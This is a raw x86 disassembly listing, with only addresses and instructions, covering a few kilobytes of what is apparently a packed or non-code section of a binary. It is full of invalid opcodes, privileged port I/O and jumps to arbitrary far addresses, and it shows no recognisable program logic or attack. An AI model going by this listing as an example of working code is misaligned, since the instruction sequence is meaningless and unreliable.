  40b5c7:	mov    ds:0xb8f1eaec,al
  40b5cc:	in     al,dx
  40b5cd:	add    dl,BYTE PTR [eax+0x7b]
  40b5d0:	sub    al,BYTE PTR [ecx+eax*2+0x63]
  40b5d4:	jg     0x40b64b
  40b5d6:	call   0x9f05e6
  40b5db:	arpl   WORD PTR [ebx+0x2c98681a],ax
  40b5e1:	inc    ebx
  40b5e2:	add    bl,bh
  40b5e4:	inc    ebx
  40b5e5:	pop    eax
  40b5e6:	add    BYTE PTR [ebx-0x44],ah
  40b5e9:	push   0x4b
  40b5eb:	and    ebp,DWORD PTR [ebp+0x4456ff02]
  40b5f1:	jmp    0x40b66c
  40b5f3:	es in  al,dx
  40b5f5:	add    cl,BYTE PTR [ebx]
  40b5f7:	mov    ds:0x1e8d6cb0,eax
  40b5fc:	cmp    BYTE PTR [ebx+0x6a],dl
	...
  40b60b:	add    BYTE PTR [eax],al
  40b60d:	add    BYTE PTR [edx+0x27],ah
  40b610:	jbe    0x40b60a
  40b612:	mov    ebx,0x9dfdb204
  40b617:	cmc    
  40b618:	sbb    eax,0x1548f76
  40b61d:	inc    esi
  40b61e:	mov    ?,ebp
  40b620:	or     eax,0x73f51f8a
  40b625:	inc    esi
  40b626:	ja     0x40b67c
  40b628:	xchg   ebx,eax
  40b629:	add    DWORD PTR [edi+ebp*2-0xf],esi
  40b62d:	jmp    0x6f65:0xfbedf733
  40b634:	fst    QWORD PTR [ebx+ecx*2+0x21]
  40b638:	fdiv   st(3),st
  40b63a:	push   ebp
  40b63b:	jg     0x40b668
  40b63d:	call   0x5022923
  40b642:	iret   
  40b643:	cmp    DWORD PTR [edx+0x79],ebp
  40b646:	dec    edi
  40b647:	push   es
  40b648:	xor    eax,0xe905cb2a
  40b64d:	jmp    0xf43b:0xc33f4ee
  40b654:	outs   dx,BYTE PTR ds:[esi]
  40b655:	sti    
  40b656:	sbb    eax,0x15ec13f5
  40b65b:	jnp    0x40b63e
  40b65d:	jmp    0x40b616
  40b65f:	mov    WORD PTR [ebp+0x797b05fb],cs
  40b665:	sti    
  40b666:	ja     0x40b665
  40b668:	nop
  40b669:	dec    esi
  40b66a:	fdivr  st(4),st
  40b66c:	jne    0x40b669
  40b66e:	ja     0x40b651
  40b670:	ins    DWORD PTR es:[edi],dx
  40b671:	jno    0x40b673
	...
  40b67f:	add    BYTE PTR [eax],al
  40b681:	pop    ebx
  40b682:	frstor ds:0x5df4dd83
  40b688:	jno    0x40b65d
  40b68a:	frstor [ebp+ecx*4+0x714df4cd]
  40b691:	mov    bh,0xdd
  40b693:	lods   al,BYTE PTR ds:[esi]
  40b694:	lea    edi,[ebp-0x348ec20c]
  40b69a:	(bad)  
  40b69c:	hlt    
  40b69d:	fdivrp st(3),st
  40b69f:	inc    BYTE PTR [eax-0x2f]
  40b6a2:	repnz (bad) 
  40b6a4:	es cwde 
  40b6a6:	jns    0x40b6a4
  40b6a8:	push   ds
  40b6a9:	jb     0x40b6e2
  40b6ab:	aas    
  40b6ac:	test   al,0x60
  40b6ae:	mov    bl,al
  40b6b0:	in     eax,0x78
  40b6b2:	fwait
  40b6b3:	sti    
  40b6b4:	push   es
  40b6b5:	js     0x40b674
  40b6b7:	rcr    ecx,0x60
  40b6ba:	pop    edx
  40b6bb:	mov    eax,DWORD PTR ds:0xee005f14
  40b6c1:	repz cld 
  40b6c3:	out    0x9a,eax
  40b6c5:	jmp    0x40b6b9
  40b6c7:	(bad)  
  40b6c8:	jb     0x40b702
  40b6ca:	push   edi
  40b6cb:	call   0x4664c9
  40b6d0:	loop   0x40b6f2
  40b6d2:	js     0x40b6ef
  40b6d4:	jmp    0x3be0:0xdbeb4c25
  40b6db:	or     eax,0x3785623d
  40b6e0:	jecxz  0x40b695
  40b6e2:	or     al,dh
  40b6e4:	jmp    0x40b6e9
	...
  40b6f1:	add    BYTE PTR [eax],al
  40b6f3:	add    BYTE PTR [eax-0x20],ah
  40b6f6:	add    DWORD PTR [edx-0x55c4c29d],edx
  40b6fc:	xchg   ebp,eax
  40b6fd:	fisttp WORD PTR [edx-0x3e415a56]
  40b703:	in     eax,dx
  40b704:	pusha  
  40b705:	pop    edx
  40b706:	mov    ecx,DWORD PTR [ebp+0x1eb3c7dd]
  40b70c:	call   0xb5c1c389
  40b711:	cmp    esi,0x74c56d66
  40b717:	in     al,0x39
  40b719:	mov    esi,0xf460f9c1
  40b71e:	je     0x40b6fd
  40b720:	mov    eax,0x2500ab86
  40b725:	out    dx,eax
  40b726:	or     eax,eax
  40b728:	out    dx,al
  40b729:	add    al,0x5f
  40b72b:	leave  
  40b72c:	js     0x40b746
  40b72e:	add    bh,bh
  40b730:	out    dx,eax
  40b731:	add    edi,edi
  40b733:	jne    0x40b6cf
  40b735:	fild   QWORD PTR [ecx-0x5]
  40b738:	jne    0x40b729
  40b73a:	mov    eax,DWORD PTR [ebp+0x6a]
  40b73d:	pop    eax
  40b73e:	push   DWORD PTR [ebp-0x5a]
  40b741:	fistp  QWORD PTR [edi]
  40b743:	(bad)  
  40b744:	gs out dx,eax
  40b746:	or     eax,eax
  40b748:	test   DWORD PTR [ebx-0x6],esi
  40b74b:	add    bh,BYTE PTR [edx+0x7]
  40b74e:	push   DWORD PTR [ebp+0x76]
  40b751:	in     eax,dx
  40b752:	jae    0x40b74c
  40b754:	xor    cl,ah
  40b756:	xchg   edx,eax
  40b757:	inc    DWORD PTR [eax]
	...
  40b765:	add    BYTE PTR [eax],al
  40b767:	xor    eax,0xbe0fc001
  40b76c:	int3   
  40b76d:	add    BYTE PTR [eax],al
  40b76f:	cmp    al,BYTE PTR [eax-0xe4e13bd]
  40b775:	jle    0x40b7b6
  40b777:	dec    edx
  40b778:	inc    BYTE PTR [ebx+0x738c9]
  40b77e:	push   edi
  40b77f:	and    al,BYTE PTR [ebx-0x1]
  40b782:	inc    ebp
  40b784:	jle    0x40b7c9
  40b786:	shl    ch,1
  40b788:	(bad)  
  40b789:	shr    BYTE PTR [eax-0x58],1
  40b78c:	sub    al,0x41
  40b78e:	add    dl,ah
  40b790:	adc    bl,BYTE PTR [ebx+0x0]
  40b793:	or     dl,BYTE PTR [edi-0x1]
  40b796:	jne    0x40b772
  40b798:	popa   
  40b799:	mov    dh,0x3f
  40b79b:	cmp    ecx,DWORD PTR [ecx]
  40b79d:	call   0x4a08b9
  40b7a2:	push   eax
  40b7a3:	inc    ebp
  40b7a4:	(bad)  
  40b7a5:	shr    BYTE PTR [eax+0x0],1
  40b7a8:	sub    eax,0x44630041
  40b7ad:	or     ebx,DWORD PTR [ebx+0x63]
  40b7b0:	fcomp  QWORD PTR [ecx+ebx*2+0x68]
  40b7b4:	sbb    al,0x70
  40b7b6:	or     al,0x68
  40b7b8:	push   cs
  40b7b9:	jo     0x40b7c3
  40b7bb:	pop    eax
  40b7bc:	and    eax,0xde268509
  40b7c1:	add    al,BYTE PTR [eax]
  40b7c3:	push   0x9c096f35
  40b7c8:	test   eax,0xae
	...
  40b7d9:	add    BYTE PTR [ebx-0x24],ah
  40b7dc:	add    ch,bl
  40b7de:	pop    esp
  40b7df:	sub    edi,DWORD PTR [edi]
  40b7e1:	mov    ah,0x63
  40b7e3:	fadd   QWORD PTR [edx]
  40b7e5:	add    BYTE PTR [edi-0x51],dh
  40b7e8:	ret    0x6cb8
  40b7eb:	sti    
  40b7ec:	idiv   esi
  40b7ee:	jno    0x40b822
  40b7f0:	cmp    al,0x7
  40b7f2:	(bad)  
  40b7f3:	fdivr  QWORD PTR [edi+0x2dc4b44]
  40b7f9:	add    BYTE PTR [ebx+0x5c],ah
  40b7fc:	cmp    BYTE PTR [eax],al
  40b7fe:	push   esp
  40b7ff:	push   0xdc63024c
  40b804:	dec    edi
  40b805:	call   0xff386a1e
  40b80a:	fisub  DWORD PTR [eax]
  40b80c:	enter  0xa682,0xc4
  40b810:	add    dh,BYTE PTR [ebp+0x42]
  40b813:	adc    al,0xb6
  40b815:	sub    esp,DWORD PTR [edx+0x1f74f7dc]
  40b81b:	test   BYTE PTR [ecx+0xbdc6359],ch
  40b821:	shr    BYTE PTR [ecx+eiz*2+0x6],0x2
  40b826:	arpl   sp,bx
  40b828:	mov    edi,0x2dcfb44
  40b82d:	add    BYTE PTR [ebx-0x7b],ah
  40b830:	add    DWORD PTR [edx],eax
  40b832:	arpl   WORD PTR ds:0xdd5784e9,ax
  40b838:	out    0x6e,eax
  40b83a:	pop    esp
  40b83b:	jl     0x40b810
  40b83d:	fild   WORD PTR [eax]
	...
  40b84b:	add    BYTE PTR [eax],al
  40b84d:	popf   
  40b84e:	inc    edi
  40b84f:	inc    ecx
  40b850:	add    eax,0xeae90563
  40b855:	out    dx,al
  40b856:	add    ebp,ecx
  40b858:	add    esp,eax
  40b85a:	outs   dx,DWORD PTR ds:[esi]
  40b85b:	inc    ecx
  40b85c:	add    eax,0x7660022e
  40b861:	or     ecx,0xffffffab
  40b864:	jmp    0x40b8c7
  40b866:	add    eax,0xa37a03e9
  40b86b:	out    0x3,eax
  40b86d:	arpl   WORD PTR [esi+0x7861eb8b],ax
  40b873:	test   BYTE PTR [edx+0x3e25d0f7],0x7b
  40b87a:	or     cl,ch
  40b87c:	add    esp,DWORD PTR [ebx-0x24]
  40b87f:	pop    esp
  40b880:	add    ah,BYTE PTR [ebx+0x5]
  40b883:	push   0x79
  40b885:	dec    ebx
  40b886:	or     dl,BYTE PTR [edi+eax*1-0x26]
  40b88a:	jb     0x40b83d
  40b88c:	mov    edi,0x3e3dd9f
  40b891:	arpl   WORD PTR ds:0x5626fd0,ax
  40b897:	jmp    0xec1e681e
  40b89c:	push   es
  40b89d:	fisub  WORD PTR [ebp-0x18]
  40b8a0:	add    esp,DWORD PTR [ebx+0x7e]
  40b8a3:	and    edx,eax
  40b8a5:	loope  0x40b919
  40b8a7:	push   ebp
  40b8a8:	add    al,0x97
  40b8aa:	(bad)  
  40b8ab:	lods   eax,DWORD PTR ds:[esi]
  40b8ac:	inc    ecx
  40b8ad:	sti    
  40b8ae:	add    ebp,ecx
  40b8b0:	add    eax,DWORD PTR [eax]
	...
  40b8be:	add    BYTE PTR [eax],al
  40b8c0:	arpl   sp,bx
  40b8c2:	in     eax,dx
  40b8c3:	mov    esi,0x3e6dd9f
  40b8c8:	arpl   WORD PTR ds:0xc5a2ae00,ax
  40b8ce:	(bad)  
  40b8cf:	call   0xad07be34
  40b8d4:	test   al,0xf0
  40b8d6:	(bad)  
  40b8d7:	jmp    0x2d85813c
  40b8dc:	pop    edi
  40b8dd:	add    eax,0x49fde900
  40b8e2:	mov    esp,0x560e9
  40b8e7:	and    ch,BYTE PTR es:[ebp+0x560e8ff]
  40b8ee:	push   DWORD PTR [esp+edi*4-0x73d8ed18]
  40b8f5:	out    dx,eax
  40b8f6:	mov    BYTE PTR [eax+eiz*4+0x773574ef],ah
  40b8fd:	or     dh,bh
  40b8ff:	push   cs
  40b900:	je     0x40b97f
  40b902:	inc    esp
  40b903:	xor    DWORD PTR [ecx+edi*2-0x2c],ebp
  40b907:	adc    DWORD PTR [edx-0xf],ebp
  40b90a:	(bad)  
  40b90b:	not    bh
  40b90d:	dec    ecx
  40b90e:	les    ebp,FWORD PTR [edx-0x66]
  40b911:	inc    edi
  40b912:	aas    
  40b913:	sub    BYTE PTR [edi+0x5],bl
  40b916:	jne    0x40b953
  40b918:	mov    edi,0x5f284034
  40b91d:	fisttp QWORD PTR [eax+esi*1]
  40b920:	addr16 add eax,0x5150
	...
  40b932:	add    BYTE PTR [eax+0x45],dh
  40b935:	inc    ecx
  40b936:	jmp    0xc2013270
  40b93b:	std    
  40b93c:	dec    ebp
  40b93d:	add    cl,ch
  40b93f:	imul   eax,ebp,0x2b870173
  40b945:	inc    eax
  40b946:	sub    BYTE PTR [edi-0x23],ah
  40b949:	lock xor DWORD PTR [edi+0x5],ebx
  40b94d:	push   eax
  40b94e:	add    DWORD PTR [ecx],edi
  40b950:	inc    ebp
  40b951:	inc    ecx
  40b952:	add    BYTE PTR [edx],cl
  40b954:	div    DWORD PTR [ebx-0x40]
  40b957:	rcl    BYTE PTR [edx-0x505ffa8],cl
  40b95d:	mov    edi,0x425c1874
  40b962:	inc    eax
  40b963:	or     eax,DWORD PTR [eax+ebp*8]
  40b966:	aad    0xa2
  40b968:	add    eax,DWORD PTR [eax]
  40b96a:	push   eax
  40b96b:	mov    ds:0xca414045,al
  40b970:	div    BYTE PTR [ebx-0x40]
  40b973:	adc    bl,BYTE PTR [edi+0x5a]
  40b976:	add    BYTE PTR [edx+0x16816da],bh
  40b97c:	inc    esp
  40b97d:	inc    ecx
  40b97e:	add    BYTE PTR [edx],ah
  40b980:	stos   DWORD PTR es:[edi],eax
  40b981:	push   esi
  40b982:	add    BYTE PTR [edx-0x45b497ad],cl
  40b988:	dec    eax
  40b989:	add    bh,bh
  40b98b:	out    0xc3,eax
  40b98d:	out    0x5d,al
  40b98f:	mov    al,0x3
  40b991:	add    BYTE PTR [ebx],cl
  40b993:	dec    edx
  40b994:	jne    0x40b9f8
  40b996:	inc    DWORD PTR [eax]
	...
  40b9a4:	add    BYTE PTR [eax],al
  40b9a6:	idiv   DWORD PTR [ebx+0x3d2a1e6]
  40b9ac:	add    BYTE PTR [eax+0x4d],dl
  40b9af:	pop    edi
  40b9b0:	enter  0x6ce8,0xeb
  40b9b4:	std    
  40b9b5:	call   ebx
  40b9b7:	cs mov esp,0xe6c5a7ff
  40b9bd:	lea    esi,[edx+0x9]
  40b9c0:	add    BYTE PTR [eax+0x1d],dl
  40b9c3:	pop    edi
  40b9c4:	(bad)  
  40b9c5:	call   0x3ea70a
  40b9ca:	ret    
  40b9cb:	cs mov eax,0xfec94f83
  40b9d1:	jae    0x40ba09
  40b9d3:	xchg   BYTE PTR [ebx-0x48],bh
  40b9d6:	cli    
  40b9d7:	pop    esi
  40b9d8:	cs push 0xef02dc63
  40b9de:	mov    ebp,0xb086e7f
  40b9e3:	call   0xc06f:0x6fecfe80
  40b9ea:	in     al,0xf1
  40b9ec:	or     ch,al
  40b9ee:	daa    
  40b9ef:	push   0xd1d4fef5
  40b9f4:	mov    dh,0xfe
  40b9f6:	push   esi
  40b9f7:	hlt    
  40b9f8:	jmp    0x36fe:0xf557df38
  40b9ff:	xchg   esp,eax
  40ba00:	hlt    
  40ba01:	je     0x40ba6e
  40ba03:	push   esp
  40ba04:	test   BYTE PTR es:[edi+ebp*1+0x74f5],ch
	...
  40ba18:	add    BYTE PTR [ebx-0x6378c6bc],ah
  40ba1e:	pop    ds
  40ba1f:	cmc    
  40ba20:	je     0x40b9cd
  40ba22:	adc    al,0x31
  40ba24:	xchg   DWORD PTR [edi+ecx*1+0x49f74f5],ecx
  40ba2b:	sub    DWORD PTR [edi+0x74f4ff7c],eax
  40ba31:	mov    bh,0x14
  40ba33:	and    DWORD PTR [edi+0x74f3ef6c],eax
  40ba39:	stos   DWORD PTR es:[edi],eax
  40ba3a:	add    al,0x19
  40ba3c:	xchg   DWORD PTR [edi+ebx*8-0x19],ebx
  40ba40:	or     al,0xe0
  40ba42:	push   0xe7d605ec
  40ba47:	mov    ebx,0x2da3b44
  40ba4c:	add    BYTE PTR [ebx+0x5b],ah
  40ba4f:	jbe    0x40ba39
  40ba51:	arpl   WORD PTR [eax],si
  40ba53:	xor    al,0x68
  40ba55:	icebp  
  40ba56:	inc    DWORD PTR [edx+0x0]
  40ba59:	and    al,0x31
  40ba5b:	enter  0xd4e7,0x13
  40ba5f:	add    al,0x0
  40ba61:	push   0x646ea905
  40ba66:	(bad)  
  40ba67:	and    ebp,esp
  40ba69:	arpl   WORD PTR ds:0x1e8b03e9,ax
  40ba6f:	sub    DWORD PTR [ebx+0x63],eax
  40ba72:	out    dx,al
  40ba73:	sti    
  40ba74:	mov    DWORD PTR [esi+ecx*4],0xfa630420
  40ba7b:	test   al,0x6e
	...
  40ba89:	add    BYTE PTR [eax],al
  40ba8b:	add    BYTE PTR [esi+eax*8+0x23],ah
  40ba8f:	in     al,dx
  40ba90:	bound  eax,QWORD PTR ds:0x77cc03e9
  40ba96:	sub    eax,0x558696eb
  40ba9b:	hlt    
  40ba9c:	mov    eax,0xb5ba2931
  40baa1:	in     eax,dx
  40baa2:	inc    ebp
  40baa3:	hlt    
  40baa4:	mov    dl,0x9e
  40baa6:	add    ch,bh
  40baa8:	push   ebp
  40baa9:	mov    BYTE PTR [esi+esi*8+0x6e2ded9d],al
  40bab0:	mov    bl,0xdc
  40bab2:	pop    esp
  40bab3:	jge    0x40ba42
  40bab5:	in     eax,dx
  40bab6:	sbb    eax,0x44dc776e
  40babb:	jge    0x40bb3a
  40babd:	in     eax,dx
  40babe:	pop    ebx
  40babf:	ds jae 0x40bb16
  40bac2:	adc    ecx,edx
  40bac4:	fsubr  st,st(5)
  40bac6:	std    
  40bac7:	jmp    0xbebd:0xf3f5ec55
  40bace:	sub    dl,BYTE PTR [ebx]
  40bad0:	arpl   WORD PTR [edx+0x72],dx
  40bad3:	loopne 0x40bab8
  40bad5:	rcl    DWORD PTR [edx+esi*8-0x765212bb],0xf4
  40badd:	jmp    0x40baac
  40badf:	repz xor al,0xed
  40bae2:	call   0xd58392ea
  40bae7:	(bad)  
  40bae8:	in     al,0x71
  40baea:	add    ah,ch
  40baec:	loopne 0x40bb22
  40baee:	add    BYTE PTR [eax+eax*1],dh
	...
  40bafd:	add    BYTE PTR [eax],al
  40baff:	push   0xffffffde
  40bb01:	hlt    
  40bb02:	call   0x153fc067
  40bb07:	imul   ebx,ebp,0x5d
  40bb0a:	js     0x40bafc
  40bb0c:	jmp    0x40bb18
  40bb0e:	test   eax,0x3e67fc7a
  40bb13:	inc    ebx
  40bb14:	inc    esi
  40bb15:	add    BYTE PTR [esi+0x6a],bh
  40bb18:	adc    eax,ebp
  40bb1a:	jb     0x40bb7a
  40bb1c:	jmp    0x40bb1c
  40bb1e:	and    BYTE PTR [edx+0x5d],0xbc
  40bb22:	adc    eax,0xd4ff0526
  40bb27:	ins    BYTE PTR es:[edi],dx
  40bb28:	fucomp st(3)
  40bb2a:	pusha  
  40bb2b:	mov    al,0xeb
  40bb2d:	mov    BYTE PTR [edi+eax*1-0x15],ah
  40bb31:	inc    BYTE PTR [esi+0xf]
  40bb34:	sub    eax,DWORD PTR [ecx]
  40bb36:	jmp    0x2bc5359b
  40bb3b:	xchg   ecx,eax
  40bb3c:	jmp    0x40bb3c
  40bb3e:	cdq    
  40bb3f:	mov    eax,0x90268668
  40bb44:	jns    0x40baca
  40bb46:	sub    edx,DWORD PTR [ecx+0x71b9feeb]
  40bb4c:	mov    cl,0xb7
  40bb4e:	pshufw mm5,mm3,0xe7
  40bb52:	dec    ecx
  40bb53:	or     BYTE PTR ds:0xb0da7000,al
  40bb59:	std    
  40bb5a:	not    BYTE PTR [ecx+0x2c]
  40bb5d:	pcmpgtw mm7,mm0
  40bb60:	add    al,0x0
  40bb62:	jmp    0x40bb67
	...
  40bb6f:	add    BYTE PTR [eax],al
  40bb71:	add    bl,ah
  40bb73:	nop
  40bb74:	rcr    edi,0x51
  40bb77:	jmp    0x40bb6f
  40bb79:	jmp    0x40bbcb
  40bb7b:	add    eax,0x8161e900
  40bb80:	add    BYTE PTR [eax],0x3a
  40bb83:	or     BYTE PTR [eax],al
  40bb85:	lea    edi,[eax+0x25]
  40bb88:	push   eax
  40bb89:	push   0x410c98
  40bb8e:	and    bl,BYTE PTR [ecx+0x57]
  40bb91:	add    dl,bh
  40bb93:	jmp    0x147:0xc8ff75be
  40bb9a:	or     cl,BYTE PTR [eax]
  40bb9c:	lea    edx,[ebp-0x20a38]
  40bba2:	ja     0x40bbe6
  40bba4:	sub    al,0x50
  40bba6:	push   edx
  40bba7:	lods   eax,DWORD PTR ds:[esi]
  40bba8:	sub    al,BYTE PTR [ecx-0x36]
  40bbab:	iret   
  40bbac:	pop    edx
  40bbad:	push   edi
  40bbae:	retf   0xb07
  40bbb1:	shr    BYTE PTR [edi-0x44d31704],0x7
  40bbb8:	add    bh,bh
  40bbba:	lahf   
  40bbbb:	adc    ebp,eax
  40bbbd:	mov    edx,0xbfdf73a
  40bbc2:	jp     0x40bc31
  40bbc4:	punpckhbw mm7,QWORD PTR [eax+edx*1+0x41]
  40bbc9:	add    BYTE PTR [ebp+0x6d],dl
  40bbcc:	adc    al,0xe8
  40bbce:	in     eax,dx
  40bbcf:	push   0xea71fffe
  40bbd4:	push   0x0
	...
  40bbe5:	gs ins DWORD PTR es:[edi],dx
  40bbe7:	adc    al,0xe8
  40bbe9:	shr    DWORD PTR [eax-0x2],0xff
  40bbed:	pop    ss
  40bbee:	(bad)  
  40bbef:	sar    dh,0x65
  40bbf2:	test   DWORD PTR [ebx+0x50519652],0xfe69c5e8
  40bbfc:	(bad)  
  40bbfd:	cli    
  40bbfe:	push   esi
  40bbff:	push   DWORD PTR [ebp+0x4a]
  40bc02:	div    BYTE PTR [ebx+0xc]
  40bc05:	and    eax,0x63e80873
  40bc0a:	iret   
  40bc0b:	icebp  
  40bc0c:	(bad)  
  40bc0d:	xor    al,0xc5
  40bc0f:	mov    BYTE PTR [esp+ebp*1+0x63dcdac4],al
  40bc16:	fadd   QWORD PTR [edx]
  40bc18:	lea    esp,[ecx-0x307b8500]
  40bc1e:	call   0x4131:0x217bfef0
  40bc25:	arpl   WORD PTR [ebx-0x6c024c4a],cx
  40bc2b:	lock out 0x5e,eax
  40bc2e:	xor    al,0x4
  40bc30:	add    BYTE PTR [eax-0x64],bl
  40bc33:	ja     0x40bc63
  40bc35:	jnp    0x40bbd9
  40bc37:	sbb    eax,DWORD PTR [ecx+0x63]
  40bc3a:	jae    0x40bcb3
  40bc3c:	adc    al,0xcb
  40bc3e:	jae    0x40bcbc
  40bc40:	dec    ah
  40bc42:	arpl   WORD PTR [edi-0xeb43a4d],si
  40bc48:	dec    edi
	...
  40bc55:	add    BYTE PTR [eax],al
  40bc57:	add    bl,cl
  40bc59:	adc    edi,DWORD PTR [ebx-0x2]
  40bc5c:	mov    ah,0xac
  40bc5e:	out    dx,eax
  40bc5f:	je     0x40bcb4
  40bc61:	inc    ebx
  40bc62:	ja     0x40bc70
  40bc64:	adc    ebp,DWORD PTR [ebx]
  40bc66:	ja     0x40bc70
  40bc68:	mov    esi,DWORD PTR [ebx]
  40bc6a:	in     al,dx
  40bc6b:	(bad)  
  40bc6c:	xchg   esp,eax
  40bc6d:	inc    esp
  40bc6e:	cmp    DWORD PTR [ebp-0x4b0edc74],eax
  40bc74:	iret   
  40bc75:	or     dh,cl
  40bc77:	dec    BYTE PTR [ebx+0x630058cc]
  40bc7d:	pop    edi
  40bc7e:	in     al,dx
  40bc7f:	add    ecx,esi
  40bc81:	(bad)  
  40bc82:	jnp    0x40bc18
  40bc84:	scas   eax,DWORD PTR es:[edi]
  40bc85:	jmp    0xe985:0xc60feef
  40bc8c:	popa   
  40bc8d:	add    BYTE PTR [ecx+0x5a057d39],0x77
  40bc94:	popa   
  40bc95:	fisubr WORD PTR [eax]
  40bc97:	pop    esp
  40bc98:	out    dx,eax
  40bc99:	sub    DWORD PTR [eax],ebp
  40bc9b:	add    al,0x34
  40bc9d:	mov    al,0x94
  40bc9f:	icebp  
  40bca0:	sub    eax,0x8d90d0ea
  40bca5:	add    eax,0x8d8b53e9
  40bcaa:	cmc    
  40bcab:	inc    edx
  40bcac:	arpl   dx,bp
  40bcae:	jae    0x40bc67
  40bcb0:	push   cs
  40bcb1:	jmp    0x3e9:0x51d6dba5
  40bcb8:	xchg   ebx,eax
  40bcb9:	pop    ebp
  40bcba:	dec    esp
  40bcbb:	xor    BYTE PTR [eax],al
	...
  40bcc9:	add    BYTE PTR [eax],al
  40bccb:	mov    ds:0xb0b68e05,al
  40bcd0:	jmp    0x416:0x67fcf085
  40bcd7:	arpl   WORD PTR [edi+0x10],cx
  40bcda:	std    
  40bcdb:	adc    al,0x70
  40bcdd:	loope  0x40bcdb
  40bcdf:	mov    dl,0x6f
  40bce1:	in     eax,dx
  40bce2:	cld    
  40bce3:	fwait
  40bce4:	jo     0x40bcf5
  40bce6:	pop    esp
  40bce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce8:	sbb    al,0xa8
  40bcea:	add    esi,DWORD PTR [edi+ebp*2+0x7d47dbf5]
  40bcf1:	inc    ebp
  40bcf2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcf4:	scas   eax,DWORD PTR es:[edi]
  40bcf5:	je     0x40bce8
  40bcf7:	popf   
  40bcf8:	jmp    0x7d089895
  40bcfd:	sub    eax,0x9bea1cf0
  40bd02:	adc    eax,DWORD PTR [edi+ebp*2+0x6f7c53ed]
  40bd09:	loope  0x40bce6
  40bd0b:	mov    al,ds:0x84f00dee
  40bd10:	lahf   
  40bd11:	ins    BYTE PTR es:[edi],dx
  40bd12:	lock gs ja 0x40bd79
  40bd16:	lds    ebx,FWORD PTR [esi-0x17]
  40bd19:	push   ebp
  40bd1b:	mov    cl,0xe8
  40bd1d:	mov    ah,0x2d
  40bd1f:	push   edx
  40bd20:	call   0x4f998f23
  40bd25:	add    cl,ch
  40bd27:	jmp    0x40bcd1
  40bd29:	push   cs
  40bd2a:	ins    BYTE PTR es:[edi],dx
  40bd2b:	mov    ebx,0xcefee7
	...
  40bd3c:	add    BYTE PTR [eax],al
  40bd3e:	cmp    al,0xb2
  40bd40:	mov    ebx,0xe7e834c7
  40bd45:	out    dx,eax
  40bd46:	mov    dh,0x5
  40bd48:	add    BYTE PTR [esi-0x51024f26],dh
  40bd4e:	cld    
  40bd4f:	loopne 0x40bdc5
  40bd51:	ins    DWORD PTR es:[edi],dx
  40bd52:	hlt    
  40bd53:	out    0xc8,eax
  40bd55:	stos   DWORD PTR es:[edi],eax
  40bd56:	push   edi
  40bd57:	add    eax,0xe8036255
  40bd5c:	je     0x40bd3b
  40bd5e:	std    
  40bd5f:	jno    0x40bd71
  40bd61:	xchg   BYTE PTR [edx-0x7],ch
  40bd64:	(bad)  
  40bd65:	hlt    
  40bd66:	fsub   st,st(0)
  40bd68:	ret    
  40bd69:	je     0x40bd2f
  40bd6b:	out    0xc8,eax
  40bd6d:	stos   DWORD PTR es:[edi],eax
  40bd6e:	arpl   WORD PTR ds:0x83c37255,ax
  40bd74:	ret    
  40bd75:	pop    ecx
  40bd76:	adc    al,0xe8
  40bd78:	je     0x40bd5f
  40bd7a:	cwde   
  40bd7b:	bound  ecx,QWORD PTR [ecx-0x400443b2]
  40bd81:	mov    esp,0x2bc9485b
  40bd86:	arpl   WORD PTR ds:0xdd70bcff,ax
  40bd8c:	push   esp
  40bd8d:	pusha  
  40bd8e:	jl     0x40bd77
  40bd90:	or     ch,BYTE PTR [ecx]
  40bd92:	or     al,BYTE PTR [edx]
  40bd94:	pop    edi
  40bd95:	xor    BYTE PTR [ecx-0x5ea0004],ah
  40bd9b:	clc    
  40bd9c:	out    0xf0,eax
  40bd9e:	in     eax,dx
  40bd9f:	out    0xfe,al
	...
  40bdb1:	jno    0x40bd77
  40bdb3:	jae    0x40bdc4
  40bdb5:	repnz shl DWORD PTR [esi],0x41
  40bdb9:	dec    edx
  40bdba:	xlat   BYTE PTR ds:[ebx]
  40bdbb:	jae    0x40bdc9
  40bdbd:	bound  ebp,QWORD PTR [edi-0x34c2007b]
  40bdc3:	or     BYTE PTR [edx+0x4a],ch
  40bdc6:	xlat   BYTE PTR ds:[ebx]
  40bdc7:	jae    0x40bdd5
  40bdc9:	and    cl,BYTE PTR [esi+0x691dff85]
  40bdcf:	inc    esp
  40bdd0:	hlt    
  40bdd1:	xchg   edx,eax
  40bdd2:	daa    
  40bdd3:	aas    
  40bdd4:	inc    ecx
  40bdd5:	or     dl,bh
  40bdd7:	jae    0x40bdcd
  40bdd9:	and    bh,BYTE PTR [esi-0x7b]
  40bddc:	(bad)  
  40bddd:	mov    ebp,0x72f84468
  40bde2:	retf   
  40bde3:	sti    
  40bde4:	add    BYTE PTR [edx],cl
  40bde6:	int3   
  40bde7:	add    eax,DWORD PTR [ebp+ecx*8-0x21ba782a]
  40bdee:	dec    ebx
  40bdef:	add    BYTE PTR [eax],dl
  40bdf1:	cli    
  40bdf2:	add    ebp,eax
  40bdf4:	clc    
  40bdf5:	dec    ecx
  40bdf6:	xlat   BYTE PTR ds:[ebx]
  40bdf7:	std    
  40bdf8:	mov    DWORD PTR [edi+0x5275fdf1],eax
  40bdfe:	int3   
  40bdff:	test   al,0x88
  40be01:	cmp    eax,0xcdc009d7
  40be06:	jg     0x40bdc3
  40be08:	add    dl,cl
  40be0a:	add    edi,edi
  40be0c:	jne    0x40be20
  40be0e:	dec    esp
  40be0f:	call   0xff447911
  40be14:	jne    0x40be16
	...
  40be22:	add    BYTE PTR [eax],al
  40be24:	pop    esi
  40be25:	int3   
  40be26:	adc    BYTE PTR [ebp-0x76],0x3
  40be2a:	cmp    eax,0x78
  40be2d:	out    0x84,al
  40be2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be30:	jp     0x40be35
  40be32:	add    BYTE PTR [ebx+0x3f7ed7df],cl
  40be38:	arpl   si,bx
  40be3a:	std    
  40be3b:	or     ebx,0xffffffdd
  40be3e:	add    al,BYTE PTR [eax]
  40be40:	sti    
  40be41:	mov    ds:0x8f63412d,al
  40be46:	fidivr DWORD PTR [ecx]
  40be48:	lods   eax,DWORD PTR ds:[esi]
  40be49:	fadd   QWORD PTR [edx]
  40be4b:	or     esp,DWORD PTR [ebx]
  40be4d:	jno    0x40bec5
  40be4f:	dec    esi
  40be51:	in     al,0x5b
  40be53:	jmp    FWORD PTR [esp+ebx*8+0x2]
  40be57:	jmp    FWORD PTR [esi+0x7bc85bcc]
  40be5d:	sbb    eax,0xffb56804
  40be62:	inc    edx
